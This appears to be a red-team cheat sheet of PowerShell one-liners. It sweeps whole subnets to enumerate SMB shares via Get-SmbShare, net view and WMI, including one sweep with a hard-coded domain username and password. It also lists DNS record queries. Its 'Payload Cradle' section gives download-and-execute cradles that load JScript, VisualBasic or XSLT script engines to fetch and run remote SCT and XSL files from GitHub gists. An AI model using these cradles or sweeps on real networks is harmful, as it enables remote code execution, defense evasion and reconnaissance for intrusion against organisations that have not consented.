Accessing SMB shares through powershell

1.  Get-Content .\file.txt | forEach-Object {Get-SMBShare -ScopeName $_}

2.  For ($i=1;1..254;$i++) {Get-SMBShare -ScopeName ("10.100.100." + $i)} 

3.  Get-SmbShareAccess -ScopeName "GCOPRN04" | Format-List

4.  For ($i=1;1..254;$i++) {$shares = net view \\10.100.100.$i /all | select -Skip 7 | ?{$_ -match 'disk*'} | %{$_ -match '^(.+?)\s+Disk*'|out-null;$matches[1]}}

5.  For ($i=1;1..254;$i++) {Write-Host ("[*} 10.100.100." + $i); Get-WmiObject -class win32_share -ComputerName ("10.100.100." + $i)}

6.  $UserName = "domain_name\seemant"; $sec_password = "Password@123"; $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $UserName, $sec_password; For ($i=1;1..254;$i++) {Write-Host ("[*} 10.100.100." + $i); Get-WmiObject -class win32_share -credential $Credentials -ComputerName ("10.100.100." + $i)}

7.  Copy the content in .ps1 and run:

$b = 1..254 #Decide last octet range

foreach ($i in $b) {
    $IPAddress = "192.168.81." + $i #here you will need to change the value for first three octet
    if (Test-Connection $IPAddress -Count 1 -ErrorAction SilentlyContinue){
        write-host $IPAddress | Out-File -Append Result.txt
        get-WmiObject -class Win32_Share -computer $IPAddress | Out-File -Append Result.txt
    }
}

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Payload Cradle
---------------
SCT Launch Execution Reflection.Assembly Via ( Microsoft.JScript )

[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetO
bject("script:https://gist.githubusercontent.com/SeemantBisht/043cd13e0efef9a4b9e4f24272669d4a/raw/61444755ce35af70323174c7acd93e343
764b818/note_spawn.sct").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())

SCT Launch Execution Reflection.Assembly Via ( Microsoft.VisualBasic )

[Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:https://gist.githubusercontent.com/SeemantBisht/043cd13e0efef9a4b9e4f24272669d4a/raw/61444755ce35af70323174c7acd93e343764b818/note_spawn.sct').Exec(0)

XML Launch Execution Via Reader XML,Transform Object Powershell

$s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load('https://gist.githubusercontent.com/SeemantBisht/fa25c69d12af2ab022aa0e0898debfa1/raw/9a9f3337b61e92a855bf30f27e546e3d9f30b0f0/xsl-notepad.xsl',$s,$r);$x.Transform('https://gist.githubusercontent.com/SeemantBisht/5ec1b5d59b362b82c5b8045d7c03bbd4/raw/803efb7a65252961d688888e5ed7f3b146852002/xsl-notepad.xml','z');del z;



DNS Records
---------------------
Get-DnsRecord -RecordType A -ZoneName FQDN -Server ServerName

Get-WmiObject -Namespace Root\MicrosoftDNS -Query "SELECT * FROM MicrosoftDNS_AType WHERE ContainerName='domain.com'"
---------------------------

